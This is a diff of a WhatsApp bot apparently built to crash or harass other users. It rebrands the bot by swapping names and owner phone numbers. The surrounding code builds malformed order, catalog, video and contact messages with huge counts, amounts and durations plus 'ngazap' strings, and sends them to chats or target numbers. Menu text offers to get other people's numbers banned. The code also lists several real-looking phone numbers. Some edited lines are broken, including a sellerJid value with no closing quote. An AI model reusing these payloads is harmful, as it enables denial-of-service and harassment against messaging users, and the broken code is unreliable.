@@ -104,7 +104,7 @@ const ntilink = JSON.parse(fs.readFileSync("./basetzy/lib/antilink.json"))
 // Function
 const cerpen = require('./basetzy/lib/cerpen')
 typemenu = 'image'
-wm = '𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘'
+wm = '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️'
 //=================================================//
 // Time & Date
 const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
@@ -179,11 +179,11 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833
 },
 "message": {
 "extendedTextMessage": {
-"text": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘️",
+"text": "𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️",
 "previewType": "NONE",
 "contextInfo": {
 "stanzaId": "3EB0382EDBB2",
-"participant": "6281991410940@s.whatsapp.net"
+"participant": "6285763376203@s.whatsapp.net"
 }}}}
 //=================================================//
 const pak = { 
@@ -193,7 +193,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 },
 "message": {
 "extendedTextMessage": {
-"text": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘️",
+"text": "𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️",
 "previewType": "NONE",
 "contextInfo": {
 "stanzaId": "3EB0382EDBB2",
@@ -233,7 +233,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
+"fileName": `𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
 //=================================================//
@@ -249,9 +249,9 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘",
-"orderTitle": "Lukman XD  ",
-"sellerJid": "62857887347569@s.whatsapp.net",
+"message": "𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️",
+"orderTitle": "𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️  ",
+"sellerJid": "6285763376203,
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR"
@@ -269,9 +269,9 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘",
-"orderTitle": "LukmanXD${ngazap(prefix)}",
-"sellerJid": "62857887347569@s.whatsapp.net",
+"message": " 𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️ ",
+"orderTitle": "𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️${ngazap(prefix)}",
+"sellerJid": "6285763376203@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR"
@@ -289,7 +289,7 @@ message: `${ownername}`,
 token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 totalAmount1000: "500000000000000",
 totalCurrencyCode: "IDR",
-orderTitle: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 ${ngazap(prefix)}`,
+orderTitle: `𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️ ${ngazap(prefix)}`,
 sellerJid: '0@s.whatsapp.net'}}, 
 contextInfo: {"forwardingScore":999,"isForwarded":true},
 sendEphemeral: true}
@@ -314,7 +314,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
   "groupInviteMessage": {
 "groupJid": "120363025461390219@g.us",
 "inviteCode": "z0JcSBd3mAhIfSSY",
-"inviteExpiration": "LukmanXD",
+"inviteExpiration": "𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️",
 "groupName": "𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥",
 "caption": "𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥"
 }}}
@@ -340,7 +340,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
 "fileLength": "285473",
 "seconds": 999999999,
-"caption": `LukmanXD`,
+"caption": `𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️`,
 "ptt": false,
 "mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
 "fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
@@ -863,7 +863,7 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "message": `${notif3}`,
 "jpegThumbnail":fs.readFileSync('./basetzy/gambarnye/thezyren.jpg'),
 "orderTitle": `${notif4}`,
-"sellerJid": "6281991410940@s.whatsapp.net",
+"sellerJid": "6285763376203@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR",
@@ -889,9 +889,9 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
 "retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
-"url": "wa.me/6281991410940"
+"url": "wa.me/6285763376203"
 },
-"businessOwnerJid": "6281991410940@s.whatsapp.net",
+"businessOwnerJid": "62857633762030@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: ftrolii })
 zyren.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -910,7 +910,7 @@ jpegThumbnail:log0,
 caption: `
 ◎ Lib : Multi-Device
 ◎ Terbit : *18-07-2022*
-◎ Owner :  6283847178421
+◎ Owner :  6285763376203
 
 🇲🇨 *Click Ban Number Untuk Banned Nomor Whatsapp Orang !!*`,
 footer: '𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘',
@@ -931,7 +931,7 @@ jpegThumbnail:log0,
 caption: `
 ◎ Lib : Multi-Device
 ◎ Terbit : *18-07-2022*
-◎ Owner :  6283847178421
+◎ Owner :  6285763376203
 
 🇲🇨 *Click Unban Number Untuk Meng Unban Akun Yg Terkunci !!*`,
 footer: '𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘',
@@ -1001,9 +1001,9 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
 "retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
-"url": "wa.me/6281991410940"
+"url": "wa.me/6285763376203"
 },
-"businessOwnerJid": "6281991410940@s.whatsapp.net",
+"businessOwnerJid": "6285763376203@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: trol})
 zyren.relayMessage(num, catalog.message, { messageId: catalog.key.id })
@@ -1033,9 +1033,9 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "productImageCount": 923456789,
 "firstImageId": 1,
 "retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
-"url": "wa.me/6281991410940"
+"url": "wa.me/6285763376203"
 },
-"businessOwnerJid": "6281991410940@s.whatsapp.net",
+"businessOwnerJid": "6285763376203@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: trol  })
 zyren.relayMessage(num, catalog.message, { messageId: catalog.key.id })
@@ -1160,7 +1160,7 @@ adehvn = {
 "surface": "CATALOG",
 "message": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
 "orderTitle": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘",
-"sellerJid": "62857887347569@s.whatsapp.net",
+"sellerJid": "6285763376203@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR"
@@ -1236,7 +1236,7 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "message": `${notif3}`,
 "jpegThumbnail":fs.readFileSync('./basetzy/gambarnye/deden.jpg'),
 "orderTitle": `${notif4}`,
-"sellerJid": "6281991410940@s.whatsapp.net",
+"sellerJid": "6285763376203@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR",
@@ -1386,7 +1386,7 @@ for (let i = 0; i < jumlah; i++) {
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
 "displayName": `LukmanXD${ngazap(prefix)}`,
-"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:LukmanXD\nitem1.TEL;waid=6281991410940: +6283847178421\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥\nX-WA-BIZ-NAME: Raditt\nEND:VCARD",
+"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:LukmanXD\nitem1.TEL;waid=6285763376203: +6283847178421\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥\nX-WA-BIZ-NAME: Raditt\nEND:VCARD",
 }
 }), { userJid: m.chat, quoted: kon })
 zyren.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
@@ -1428,7 +1428,7 @@ adehvn = {
 "surface": "CATALOG",
 "message": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
 "orderTitle": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘",
-"sellerJid": "62857887347569@s.whatsapp.net",
+"sellerJid": "6285763376203@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR"
@@ -1488,9 +1488,9 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productImageCount": 923456789,
 "firstImageId": 1,
 "retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
-"url": "wa.me/6281991410940"
+"url": "wa.me/6285763376203"
 },
-"businessOwnerJid": "6281991410940@s.whatsapp.net",
+"businessOwnerJid": "6285763376203@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: ftrolii })
 zyren.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -1517,9 +1517,9 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
 "retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
-"url": "wa.me/6285714170944"
+"url": "wa.me/6285763376203"
 },
-"businessOwnerJid": "6281991410940@s.whatsapp.net",
+"businessOwnerJid": "6285763376203@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: ftrolii })
 zyren.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -6947,7 +6947,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 │⿻ Shio
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -6975,7 +6975,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ║⿻ Tafsirsurah
 │┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7013,7 +7013,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ║⿻ Fajar-News 
 │┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
+footer: '𝑪𝒙𝒙𝒛𝒚 𝑴𝒅〽️',
 templateButtons: templateButtons
 }
 zyren.sendMessage(m.chat, templateMessage)
@@ -7058,7 +7058,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 │⿻ Inspect [Link Gc]
 ║┗⊱
 ┗━━━━━━━━━━━━━━━━━━⬣`,
-footer: 'LukmanXD',
